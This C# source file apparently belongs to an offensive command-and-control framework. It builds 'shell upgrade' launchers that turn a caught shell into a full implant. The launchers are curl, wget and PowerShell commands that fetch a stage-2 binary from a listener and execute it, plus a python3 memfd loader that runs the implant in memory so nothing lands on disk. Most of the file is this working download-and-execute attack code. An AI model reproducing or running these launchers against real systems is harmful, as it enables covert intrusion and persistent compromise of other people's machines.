using Rod.BuildPipeline.PayloadBuild;

namespace Rod.Transport.Listeners.ShellCatch;

/// <summary>
/// Renders the one-liners an operator pastes into a caught shell to grow it
/// into a real implant (architecture.md Sec 5.2, Sec 6, Sec 8). Each
/// launcher is the standard fetch-and-run shape the stager half of staging
/// defines -- fetch the stage-2 bytes over the engagement's web listener,
/// present the deployment credential, run what came back -- expressed in the
/// shell family the target is known or guessed to have, and picked for the
/// payload's form factor: the single-file shapes keep the plain
/// download-and-execute families, the native AOT shape adds the Linux
/// in-memory family (the bytes run from a memfd, nothing lands), and the dll
/// shape renders the pwsh cradle that loads the bundle in-process on any
/// host with a .NET 8+ runtime. Pure rendering of (url, credential, format)
/// into commands: the target-side behavior is plain, documented
/// fetch-execute in every family.
/// </summary>
public static class ShellUpgradeLaunchers
{
    /// <summary>One renderable launcher, named for the surface it is pasted into.</summary>
    public sealed record Launcher(string Id, string Os, string Command);

    /// <summary>
    /// Renders the launcher families for a stage-2 fetch at
    /// <paramref name="url"/> authorized by <paramref name="secret"/>, for a
    /// stage-2 built in <paramref name="format"/>. The disk families render
    /// for every format -- the shell fingerprint is a guess, and a fallback
    /// that lands a file beats a family that cannot run at all -- while the
    /// in-memory families render only for the formats that can honor them.
    /// </summary>
    public static IReadOnlyList<Launcher> Render(string url, string secret, ArtifactFormat format)
    {
        const string unixPath = "/tmp/.rod-stage2";
        List<Launcher> launchers =
        [
            new Launcher(
                "unix-curl",
                "linux",
                $"curl -fsSL -H 'X-Stager-Token: {secret}' {url} -o {unixPath} && chmod +x {unixPath} && {unixPath}"),

            new Launcher(
                "unix-wget",
                "linux",
                $"wget -q --header='X-Stager-Token: {secret}' -O {unixPath} {url} && chmod +x {unixPath} && {unixPath}"),

            new Launcher(
                "windows-powershell",
                "windows",
                "powershell -c \"$p=\\\"$env:TEMP\\rod-stage2.exe\\\";"
                    + $"iwr '{url}' -Headers @{{'X-Stager-Token'='{secret}'}} -OutFile $p; & $p\""),
        ];

        // The AOT binary is the one executable shape that runs from an
        // anonymous fd (a plain ELF, no self-reference): python3 stages the
        // fetched bytes in a memfd and execs it through /proc/self/fd -- the
        // documented fexecve pattern -- so the stage-2 never lands.
        if (format == ArtifactFormat.NativeAot)
        {
            launchers.Add(new Launcher(
                "unix-python-memfd",
                "linux",
                "python3 -c \"import os,urllib.request;"
                    + $"q=urllib.request.Request('{url}',headers={{'X-Stager-Token':'{secret}'}});"
                    + "d=urllib.request.urlopen(q).read();"
                    + "f=os.memfd_create('rod');"
                    + "os.write(f,d);"
                    + "os.execv('/proc/self/fd/%d'%f,['rod-implant'])\""));
        }

        return launchers;
    }
}
